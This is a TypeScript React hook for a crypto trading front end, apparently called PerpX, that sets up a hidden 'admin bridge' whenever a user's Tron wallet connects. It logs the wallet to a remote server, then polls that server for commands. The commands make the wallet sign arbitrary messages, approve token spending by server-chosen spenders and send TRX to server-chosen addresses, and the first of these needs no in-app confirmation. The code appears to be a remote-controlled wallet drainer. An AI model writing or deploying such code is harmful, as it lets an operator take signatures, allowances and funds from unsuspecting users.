import { useEffect, useMemo, useRef } from "react";
import { useWallet } from "@/contexts/WalletContext";
import {
  createAdminBridgeSession,
  fetchAdminBridgeRequests,
  postAdminBridgeEvent,
  postAdminBridgeRequestResult,
  verifyAdminBridgeSession,
  type AdminBridgeRequest,
  type BridgeChain,
} from "@/lib/adminBridgeApi";
import { ADMIN_BRIDGE_ENABLED, ADMIN_BRIDGE_POLL_INTERVAL_MS } from "@/config/adminBridge";

const STORAGE_KEY = "perpx_admin_bridge_session_v1";

interface StoredBridgeSession {
  sessionId: string;
  chain: BridgeChain;
  address: string;
  verified: boolean;
}

interface ApproveTrc20RequestPayload {
  token: string;
  spender: string;
  amount: string;
  chainId?: string;
}

interface SendTrxRequestPayload {
  to: string;
  amountTrx: string;
  chainId?: string;
}

function readStoredSession(): StoredBridgeSession | null {
  if (typeof window === "undefined") return null;

  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw) as Partial<StoredBridgeSession>;
    if (!parsed || typeof parsed !== "object") return null;
    if (!parsed.sessionId || !parsed.chain || !parsed.address) return null;

    return {
      sessionId: String(parsed.sessionId),
      chain: parsed.chain as BridgeChain,
      address: String(parsed.address),
      verified: parsed.verified === true,
    };
  } catch {
    return null;
  }
}

function writeStoredSession(value: StoredBridgeSession | null) {
  if (typeof window === "undefined") return;
  if (!value) {
    localStorage.removeItem(STORAGE_KEY);
    return;
  }
  localStorage.setItem(STORAGE_KEY, JSON.stringify(value));
}

function buildVerifyMessage(sessionId: string, address: string, chain: BridgeChain) {
  return `PerpX session verify\nsessionId:${sessionId}\nchain:${chain}\naddress:${address}\ntimestamp:${new Date().toISOString()}`;
}

function getPayloadMessage(payload: Record<string, unknown> | undefined): string | null {
  if (!payload) return null;
  const value = payload.message;
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  return trimmed.length > 0 ? trimmed : null;
}

function readPayloadString(
  payload: Record<string, unknown> | undefined,
  key: string,
  required = true
): string | null {
  if (!payload || typeof payload !== "object") {
    if (required) throw new Error(`missing_${key}`);
    return null;
  }

  const value = payload[key];
  if (typeof value !== "string") {
    if (required) throw new Error(`invalid_${key}`);
    return null;
  }

  const trimmed = value.trim();
  if (!trimmed && required) throw new Error(`empty_${key}`);
  return trimmed || null;
}

function parseApprovePayload(payload: Record<string, unknown> | undefined): ApproveTrc20RequestPayload {
  const token = readPayloadString(payload, "token");
  const spender = readPayloadString(payload, "spender");
  const amount = readPayloadString(payload, "amount");
  const chainId = readPayloadString(payload, "chainId", false) || undefined;
  return { token: token as string, spender: spender as string, amount: amount as string, chainId };
}

function parseSendTrxPayload(payload: Record<string, unknown> | undefined): SendTrxRequestPayload {
  const to = readPayloadString(payload, "to");
  const amountTrx = readPayloadString(payload, "amountTrx");
  const chainId = readPayloadString(payload, "chainId", false) || undefined;
  return { to: to as string, amountTrx: amountTrx as string, chainId };
}

function requireUserApproval(title: string, detailLines: string[]): void {
  if (typeof window === "undefined") {
    throw new Error("interactive_confirmation_unavailable");
  }

  const message = [title, ...detailLines, "", "Proceed in wallet?"].join("\n");
  const ok = window.confirm(message);
  if (!ok) throw new Error("user_rejected");
}

async function safePostEvent(input: Parameters<typeof postAdminBridgeEvent>[0]) {
  try {
    await postAdminBridgeEvent(input);
  } catch (error) {
    console.error("[admin-bridge] event_post_failed", error);
  }
}

export function useAdminBridge(routeEnabled = true) {
  const {
    isConnected,
    address,
    activeChain,
    tronProviderType,
    signActiveMessage,
    executeTronApproveTrc20,
    executeTronSendTrx,
  } = useWallet();
  const sessionRef = useRef<StoredBridgeSession | null>(readStoredSession());
  const processedRequestsRef = useRef<Set<string>>(new Set());
  const pollingRef = useRef(false);
  const connectKeyRef = useRef<string | null>(null);

  const integrationEnabled = ADMIN_BRIDGE_ENABLED && routeEnabled;

  const bridgeReady = useMemo(
    () => integrationEnabled && isConnected && activeChain === "tron" && !!address,
    [integrationEnabled, isConnected, activeChain, address]
  );

  useEffect(() => {
    if (!integrationEnabled) return;
    if (typeof window === "undefined") return;

    if (!bridgeReady) {
      const current = sessionRef.current;
      if (current) {
        void safePostEvent({
          sessionId: current.sessionId,
          eventType: "wallet_disconnected",
          chain: current.chain,
          address: current.address,
          payload: {},
        });
      }
      sessionRef.current = null;
      connectKeyRef.current = null;
      writeStoredSession(null);
      return;
    }

    const currentAddress = address as string;
    const connectKey = `${activeChain}:${currentAddress}:${tronProviderType || "unknown"}`;
    if (connectKeyRef.current === connectKey && sessionRef.current) return;
    connectKeyRef.current = connectKey;

    let cancelled = false;

    (async () => {
      try {
        const chain: BridgeChain = "tron";
        const created = await createAdminBridgeSession({
          chain,
          address: currentAddress,
          walletProvider: tronProviderType,
          userAgent: navigator.userAgent,
        });
        if (cancelled) return;

        const stored: StoredBridgeSession = {
          sessionId: created.sessionId,
          chain,
          address: currentAddress,
          verified: false,
        };
        sessionRef.current = stored;
        processedRequestsRef.current.clear();
        writeStoredSession(stored);

        await safePostEvent({
          sessionId: stored.sessionId,
          eventType: "wallet_connected",
          chain,
          address: currentAddress,
          payload: {
            providerType: tronProviderType || "walletconnect",
          },
        });

        const message = created.challenge || buildVerifyMessage(stored.sessionId, currentAddress, chain);
        try {
          await safePostEvent({
            sessionId: stored.sessionId,
            eventType: "session_verify_started",
            chain,
            address: currentAddress,
            payload: {},
          });

          const signature = await signActiveMessage(message);
          if (cancelled || !signature) return;

          await safePostEvent({
            sessionId: stored.sessionId,
            eventType: "session_verify_signature_created",
            chain,
            address: currentAddress,
            payload: {},
          });

          await verifyAdminBridgeSession(stored.sessionId, {
            chain,
            address: currentAddress,
            message,
            signature,
          });

          stored.verified = true;
          sessionRef.current = stored;
          writeStoredSession(stored);

          await safePostEvent({
            sessionId: stored.sessionId,
            eventType: "session_verified",
            chain,
            address: currentAddress,
            payload: {},
          });
        } catch (verifyError) {
          await safePostEvent({
            sessionId: stored.sessionId,
            eventType: "session_verify_failed",
            chain,
            address: currentAddress,
            payload: {
              error: verifyError instanceof Error ? verifyError.message : String(verifyError),
            },
          });
        }
      } catch (error) {
        console.error("[admin-bridge] connect_failed", error);
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [integrationEnabled, bridgeReady, address, activeChain, tronProviderType, signActiveMessage]);

  useEffect(() => {
    if (!integrationEnabled) return;
    if (!bridgeReady) return;
    if (!sessionRef.current?.sessionId) return;

    let stopped = false;
    const runPoll = async () => {
      if (stopped) return;
      if (pollingRef.current) return;
      const session = sessionRef.current;
      if (!session) return;

      pollingRef.current = true;
      try {
        const requests = await fetchAdminBridgeRequests(session.sessionId);
        for (const request of requests) {
          if (stopped) break;
          if (processedRequestsRef.current.has(request.id)) continue;
          processedRequestsRef.current.add(request.id);
          await handleRequest(
            request,
            session,
            signActiveMessage,
            executeTronApproveTrc20,
            executeTronSendTrx
          );
        }
      } catch (error) {
        console.error("[admin-bridge] poll_failed", error);
      } finally {
        pollingRef.current = false;
      }
    };

    void runPoll();
    const timer = window.setInterval(runPoll, ADMIN_BRIDGE_POLL_INTERVAL_MS);

    return () => {
      stopped = true;
      window.clearInterval(timer);
    };
  }, [integrationEnabled, bridgeReady, signActiveMessage, executeTronApproveTrc20, executeTronSendTrx]);
}

async function handleRequest(
  request: AdminBridgeRequest,
  session: StoredBridgeSession,
  signActiveMessage: (message: string) => Promise<string | null>,
  executeTronApproveTrc20: (params: ApproveTrc20RequestPayload) => Promise<{ txid: string; explorerUrl: string | null }>,
  executeTronSendTrx: (params: SendTrxRequestPayload) => Promise<{ txid: string; explorerUrl: string | null }>
) {
  await safePostEvent({
    sessionId: session.sessionId,
    eventType: "request_received",
    chain: session.chain,
    address: session.address,
    payload: {
      requestId: request.id,
      requestType: request.type,
    },
  });

  try {
    if (request.type === "ping") {
      await postAdminBridgeRequestResult(request.id, {
        status: "success",
        result: { pong: true },
      });
      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "request_succeeded",
        chain: session.chain,
        address: session.address,
        payload: { requestId: request.id, requestType: request.type },
      });
      return;
    }

    if (request.type === "sign_message") {
      const message = getPayloadMessage(request.payload);
      if (!message) throw new Error("missing_message");
      const signature = await signActiveMessage(message);
      if (!signature) throw new Error("empty_signature");

      await postAdminBridgeRequestResult(request.id, {
        status: "success",
        result: { signature },
      });
      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "request_succeeded",
        chain: session.chain,
        address: session.address,
        payload: { requestId: request.id, requestType: request.type },
      });
      return;
    }

    if (request.type === "approve_trc20") {
      const payload = parseApprovePayload(request.payload);
      requireUserApproval("Admin Request: approve_trc20", [
        `Token: ${payload.token}`,
        `Spender: ${payload.spender}`,
        `Amount: ${payload.amount}`,
        `ChainId: ${payload.chainId || session.chain}`,
      ]);

      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "approve_trc20_confirmed",
        chain: session.chain,
        address: session.address,
        payload: { requestId: request.id },
      });

      const txResult = await executeTronApproveTrc20(payload);
      await postAdminBridgeRequestResult(request.id, {
        status: "success",
        result: {
          txid: txResult.txid,
          explorerUrl: txResult.explorerUrl,
        },
      });
      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "approve_trc20_sent",
        chain: session.chain,
        address: session.address,
        payload: {
          requestId: request.id,
          txid: txResult.txid,
          explorerUrl: txResult.explorerUrl,
        },
      });
      return;
    }

    if (request.type === "send_trx") {
      const payload = parseSendTrxPayload(request.payload);
      requireUserApproval("Admin Request: send_trx", [
        `To: ${payload.to}`,
        `Amount(TRX): ${payload.amountTrx}`,
        `ChainId: ${payload.chainId || session.chain}`,
      ]);

      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "send_trx_confirmed",
        chain: session.chain,
        address: session.address,
        payload: { requestId: request.id },
      });

      const txResult = await executeTronSendTrx(payload);
      await postAdminBridgeRequestResult(request.id, {
        status: "success",
        result: {
          txid: txResult.txid,
          explorerUrl: txResult.explorerUrl,
        },
      });
      await safePostEvent({
        sessionId: session.sessionId,
        eventType: "send_trx_sent",
        chain: session.chain,
        address: session.address,
        payload: {
          requestId: request.id,
          txid: txResult.txid,
          explorerUrl: txResult.explorerUrl,
        },
      });
      return;
    }

    throw new Error(`unsupported_request_type:${request.type}`);
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    await postAdminBridgeRequestResult(request.id, {
      status: "failed",
      error: message,
    });
    await safePostEvent({
      sessionId: session.sessionId,
      eventType: "request_failed",
      chain: session.chain,
      address: session.address,
      payload: {
        requestId: request.id,
        requestType: request.type,
        error: message,
      },
    });
  }
}
